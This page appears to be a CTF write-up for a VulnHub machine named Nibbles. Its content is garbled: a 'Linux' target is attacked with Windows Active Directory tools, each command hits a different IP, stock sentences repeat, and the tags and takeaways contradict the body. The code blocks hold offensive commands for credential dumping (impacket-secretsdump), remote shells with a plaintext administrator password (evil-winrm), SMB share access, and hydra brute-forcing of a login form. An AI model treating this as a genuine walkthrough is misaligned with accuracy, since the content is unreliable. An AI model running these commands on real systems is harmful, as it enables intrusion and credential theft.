---
TitleSEO: "VulnHub — Nibbles (Hard Linux) | ZureFX"
TitlePost: "VulnHub — Nibbles (Hard Linux)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Nibbles. SQL Injection and Remote File Inclusion to achieve hard compromise on Linux."
Keywords: "ctf, reversing, active directory, insane"
URL: "https://zurefx.github.io/writeups/htb-nibbles-483.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-nibbles-483/"
Date: "2024-03-15"
Tags: "CTF, Reversing, Active Directory, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-nibbles-483"
Permalink: "/writeups/htb-nibbles-483.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Nibbles** is rated **Hard** on VulnHub. It runs **Linux** and the IP address during this analysis was `10.128.5.91`.

### Objectives

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.61.78.48/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.57.45.50 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code.

### Service Enumeration

The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine. The application stored sensitive credentials in an unencrypted configuration file.

```bash
evil-winrm -i 10.76.251.209 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.71.41.165 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.32.12.74/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

### SMB Enumeration

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.85.127.6
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.58.69.223 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target.

Key finding: **Remote File Inclusion**.

The database credentials were hardcoded in the application source code. Weak file permissions allowed modification of critical system files.

### Initial Access

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
feroxbuster -h
evil-winrm -i 10.45.115.64 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.66.138.52
```

Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

```bash
evil-winrm -i 10.128.30.253 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

```bash
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.119.220.253 -u administrator -p 'P@ssw0rd!' --shares
```

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `ldapsearch`
- `secretsdump`
- `dcomexec`
- `nikto`
- `msfvenom`
- `ligolo-ng`

### Key Takeaways

- SQL Injection
- Remote File Inclusion
- Constrained Delegation
- Insecure Deserialization
